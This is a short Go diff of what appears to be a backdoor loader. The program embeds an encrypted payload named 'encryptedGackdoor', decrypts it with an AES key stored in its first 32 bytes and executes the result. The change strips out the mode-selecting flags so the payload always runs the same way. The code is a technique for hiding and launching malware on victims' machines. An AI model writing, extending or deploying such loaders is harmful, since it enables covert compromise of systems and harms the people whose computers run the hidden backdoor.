@@ -4,7 +4,6 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	_ "embed"
-	"flag"
 	"os"
 	"os/exec"
 
@@ -27,9 +26,6 @@ func decryptFile(enc, key []byte) []byte {
 var encryptedGackdoor []byte
 
 func main() {
-	local := flag.Bool("l", false, "")
-	set := flag.Bool("s", false, "")
-	flag.Parse()
 	key := encryptedGackdoor[:32]
 	ct := encryptedGackdoor[32:]
 	payload := decryptFile(ct, key)
@@ -40,13 +36,7 @@ func main() {
 	defer exe.Close()
 
 	var cmd *exec.Cmd
-	if *local {
-		cmd = exe.Command("l")
-	} else if *set {
-		cmd = exe.Command("s")
-	} else {
-		cmd = exe.Command()
-	}
+	cmd = exe.Command()
 	err = cmd.Run()
 	if err != nil {
 		println(err.Error())
